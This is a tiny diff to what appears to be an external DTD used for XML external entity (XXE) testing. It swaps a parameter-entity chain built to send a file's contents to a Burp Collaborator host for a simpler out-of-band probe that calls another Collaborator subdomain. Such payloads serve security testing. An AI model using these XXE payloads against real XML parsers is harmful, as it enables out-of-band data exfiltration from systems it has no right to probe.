@@ -1,4 +1,1 @@
-<!ENTITY % file "aaaa">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ccc.vhg4wnc3a388yr5lw9w25fi11s7lva.burpcollaborator.net/?x=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % xxe1 SYSTEM "http://aa.75agkz0fyfwkm3txklketr6dp4v0jp.burpcollaborator.net/aa"> %xxe1;
